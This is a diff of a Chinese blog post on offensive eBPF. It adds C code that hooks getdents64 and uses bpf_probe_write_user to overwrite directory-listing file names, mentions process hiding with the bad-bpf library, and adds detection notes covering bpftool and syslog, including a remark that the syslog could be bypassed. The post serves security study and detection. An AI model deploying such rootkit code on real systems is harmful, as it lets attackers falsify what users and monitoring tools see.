+</span></span><span class="line"><span class="cl">    <span class="n">tid_t</span> <span class="n">tid</span> <span class="o">=</span> <span class="n">bpf_get_current_pid_tgid</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="o">*</span> <span class="n">dir_addr</span>  <span class="o">=</span> <span class="n">bpf_map_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_entries</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">dir_addr</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">bpf_map_delete_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">dir_entries</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">tid</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="cm">/* Loop over directory entries */</span>
+</span></span><span class="line"><span class="cl">    <span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span> <span class="n">d_entry</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span>      <span class="n">d_reclen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">short</span> <span class="kt">int</span>      <span class="n">d_name_len</span><span class="p">;</span> 
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span>                    <span class="n">offset</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">d_entry_base_addr</span> <span class="o">=</span> <span class="o">*</span><span class="n">dir_addr</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">long</span>              <span class="n">ret</span>               <span class="o">=</span> <span class="n">ctx</span><span class="o">-&gt;</span><span class="n">ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">//MAX_D_NAME_LEN == 128 - const isn&#39;t working with allocation here...
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">char</span> <span class="n">d_name</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>  
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span>  <span class="n">count</span> <span class="o">=</span> <span class="mi">16</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">char</span> <span class="n">d_type</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">i</span><span class="o">=</span><span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">while</span> <span class="p">(</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">256</span><span class="p">)</span>   <span class="c1">// limitation for now, only examine the first 256 entries
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;Loop %d: offset: %d, total len: %d&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">offset</span><span class="p">,</span> <span class="n">ret</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">offset</span> <span class="o">&gt;=</span> <span class="n">ret</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">d_entry</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">linux_dirent64</span> <span class="o">*</span><span class="p">)</span> <span class="p">(</span><span class="n">d_entry_base_addr</span> <span class="o">+</span> <span class="n">offset</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// read d_reclen
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d_reclen</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">d_reclen</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_reclen</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">// skip if it&#39;s a directory entry
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d_type</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">d_type</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_type</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="n">d_type</span> <span class="o">==</span> <span class="n">DT_DIR</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="n">d_reclen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1">//read d_name
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">d_name_len</span> <span class="o">=</span> <span class="n">d_reclen</span> <span class="o">-</span> <span class="mi">2</span> <span class="o">-</span> <span class="p">(</span><span class="n">offsetof</span><span class="p">(</span><span class="k">struct</span> <span class="n">linux_dirent64</span><span class="p">,</span> <span class="n">d_name</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">        <span class="kt">long</span> <span class="n">success</span> <span class="o">=</span> <span class="n">bpf_probe_read_user</span><span class="p">(</span><span class="o">&amp;</span><span class="n">d_name</span><span class="p">,</span> <span class="n">MAX_D_NAME_LEN</span><span class="p">,</span> <span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">success</span> <span class="o">!=</span> <span class="mi">0</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="n">offset</span> <span class="o">+=</span> <span class="n">d_reclen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">continue</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;d_reclen: %d, d_name_len: %d, %s&#34;</span><span class="p">,</span> <span class="n">d_reclen</span><span class="p">,</span> <span class="n">d_name_len</span><span class="p">,</span> <span class="n">d_name</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="cm">/* match and overwrite */</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span> <span class="n">d_name_len</span> <span class="o">&gt;</span> <span class="mi">7</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="p">{</span>	
+</span></span><span class="line"><span class="cl">            <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;** sys_enter_getdents64 ** OVERWRITING&#34;</span><span class="p">);</span> 		
+</span></span><span class="line"><span class="cl">            
+</span></span><span class="line"><span class="cl">            <span class="kt">char</span> <span class="n">replace</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&#34;ruokeqx&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">            <span class="c1">// overwrite the user space d_name buffer
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="kt">long</span> <span class="n">success</span> <span class="o">=</span> <span class="n">bpf_probe_write_user</span><span class="p">((</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="o">&amp;</span><span class="n">d_entry</span><span class="o">-&gt;</span><span class="n">d_name</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="n">replace</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">char</span><span class="p">)</span> <span class="o">*</span> <span class="mi">7</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="n">bpf_printk</span><span class="p">(</span><span class="s">&#34;** RESULT %d&#34;</span><span class="p">,</span> <span class="n">success</span><span class="p">);</span> 
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">offset</span> <span class="o">+=</span> <span class="n">d_reclen</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">i</span><span class="o">++</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>运行结果如图 可以看到所有文件名都被修改了</p>
+<p><img src="/images/posts/offensive_bpf/image-20220620172918255.png" alt="image-20220620172918255" /></p>
+<h3 id="隐藏进程">隐藏进程</h3>
+<p>bad-bpf库提供的功能</p>
+<p><img src="/images/posts/offensive_bpf/image-20220620221936797.png" alt="image-20220620221936797" /></p>
 <h2 id="检测">检测</h2>
+<h3 id="detection-bpf">Detection: BPF</h3>
 <p>检测主要是围绕BPF()系统调用获取信息，当然需要确保你的工具获取的是正确的信息（因为你的工具可能被trace 甚至BPF系统调用可能被trace）</p>
 <p>最常见的就是内核中自带的工具bpftool，在<a href="/posts/bpf_performance_tools/">之前的文章</a>中也有写过</p>
 <p><img src="/images/posts/offensive_bpf/image-20220618210153114.png" alt="image-20220618210153114" /></p>
@@ -2067,11 +2412,19 @@ int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
 </div><p>需要注意的是如果恶意 BPF 程序在日志收集或检测工具运行之前开始运行，那么 BPF 程序可以将自身安装为 rootkit 以逃避检测。</p>
 <p>由于BPF不自启动，重启系统也是关闭BPF程序的一种方法</p>
 <p>一些性能检测工具或许会有供应链攻击隐患</p>
+<h3 id="detectionbpf_probe_write_user">Detection：bpf_probe_write_user</h3>
+<p>bpf_probe_write_user 调用的时候会生成syslog</p>
+<p>理论上跟hook BPF系统调用类似 也可以通过hook来bypass syslog</p>
 <h2 id="reference">Reference</h2>
 <p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf/">https://embracethered.com/blog/posts/2021/offensive-bpf/</a></p>
 <p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/">https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace/</a></p>
 <p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace-message-based/">https://embracethered.com/blog/posts/2021/offensive-bpf-bpftrace-message-based/</a></p>
 <p><a href="https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf_probe_write_user/">https://embracethered.com/blog/posts/2021/offensive-bpf-libbpf-bpf_probe_write_user/</a></p>
+<p><a href="https://nakryiko.com/posts/libbpf-bootstrap">https://nakryiko.com/posts/libbpf-bootstrap</a></p>
+<p><a href="https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html">https://tech.meituan.com/2022/04/07/how-to-detect-bad-ebpf-used-in-linux.html</a></p>
+<p><a href="https://github.com/pathtofile/bad-bpf">https://github.com/pathtofile/bad-bpf</a></p>
+<p><a href="https://cloud.tencent.com/developer/inventory/600/article/1626925">https://cloud.tencent.com/developer/inventory/600/article/1626925</a></p>
+<p><a href="https://github.com/xdp-project/xdp-tutorial">https://github.com/xdp-project/xdp-tutorial</a></p>
 
     </article>
     
@@ -2762,6 +3115,9 @@ document.addEventListener('DOMContentLoaded', function () {
         <li><a href="#bpf功能">BPF功能</a></li>
         <li><a href="#加载bpf程序">加载BPF程序</a></li>
         <li><a href="#bpf安全相关">BPF安全相关</a></li>
+        <li><a href="#btf">BTF</a></li>
+        <li><a href="#xdp">XDP</a></li>
+        <li><a href="#libbpf--libbpf-bootstrap">libbpf &amp;&amp; libbpf-bootstrap</a></li>
       </ul>
     </li>
     <li><a href="#bpftrace-backdoor">bpftrace backdoor</a>
@@ -2778,9 +3134,15 @@ document.addEventListener('DOMContentLoaded', function () {
     <li><a href="#malicious-bpf">Malicious bpf</a>
       <ul>
         <li><a href="#修改文件名">修改文件名</a></li>
+        <li><a href="#隐藏进程">隐藏进程</a></li>
       </ul>
     </li>
-    <li><a href="#检测">检测</a></li>
+    <li><a href="#检测">检测</a>
+      <ul>
+        <li><a href="#detection-bpf">Detection: BPF</a></li>
+        <li><a href="#detectionbpf_probe_write_user">Detection：bpf_probe_write_user</a></li>
+      </ul>
+    </li>
     <li><a href="#reference">Reference</a></li>
   </ul>
 </nav>
